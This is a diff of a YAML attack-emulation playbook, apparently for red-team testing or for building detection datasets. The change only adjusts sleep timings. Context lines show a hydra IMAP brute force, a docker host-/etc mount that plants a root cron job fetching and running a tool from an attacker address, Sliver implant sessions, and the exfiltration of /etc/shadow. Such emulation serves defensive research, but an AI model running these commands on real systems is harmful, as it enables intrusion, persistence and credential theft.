@@ -31,8 +31,7 @@ commands:
 
   - type: sleep
     seconds: 30
-    min_sec: 5
-    random: true
+
 
   - type: shell
     cmd: hydra -l "alice@$DOMAIN" -P smtp-pass.txt -c 5 -s 143 $MAIL_HOST imap  
@@ -44,8 +43,6 @@ commands:
 
   - type: sleep
     seconds: 30
-    min_sec: 5
-    random: true
 
   - type: http-client
     url: http://$SERVER_ADDRESS:8080
@@ -110,8 +107,6 @@ commands:
 
   - type: sleep
     seconds: 30
-    min_sec: 5
-    random: true
 
   - type: msf-session
     session: "foothold"
@@ -129,9 +124,6 @@ commands:
 
   - type: sleep
     seconds: 30
-    min_sec: 5
-    random: true
-
 
   - type: shell
     cmd: docker -H tcp://localhost:1090 network list
@@ -142,8 +134,6 @@ commands:
 
   - type: sleep
     seconds: 30
-    min_sec: 5
-    random: true
 
   - type: shell
     cmd: docker -H tcp://localhost:1090 run --rm -t -u root --network=nextcloud_default -v /etc:/root/etc  kalilinux/kali-rolling bash -c "echo \"*/5 * * * * root test -e /opt/tool || curl http://$ATTACKER_ADDRESS:8888/tool > /opt/tool && chmod +x /opt/tool && /opt/tool\" > /root/etc/cron.d/sysvz"
@@ -152,6 +142,8 @@ commands:
       tactics: "Defense Evasion,Execution,Persistence,Privilege Escalation,Lateral Movement"
       description: "Attacker mounts etc-directory of the host into a container and creates a cron-job in it that executes the sliver-implant as root outside of the container"
 
+  - type: sleep
+    seconds: 360
 
   - type: sliver-session
     cmd: ls
@@ -165,8 +157,6 @@ commands:
 
   - type: sleep
     seconds: 30
-    min_sec: 5
-    random: true
 
   - type: sliver-session
     cmd: ps
@@ -182,8 +172,6 @@ commands:
 
   - type: sleep
     seconds: 30
-    min_sec: 5
-    random: true
 
   - type: sliver-session
     cmd: download
@@ -195,3 +183,7 @@ commands:
       tactics: "Credential Access,Collection,Exfiltration"
       technique_name: "OS Credential Dumping: /etc/passwd and /etc/shadow,Exfiltration Over C2 Channel"
       description: "Use sliver to dump /etc/shadow credentials"
+
+  - type: sleep
+    seconds: 30
+
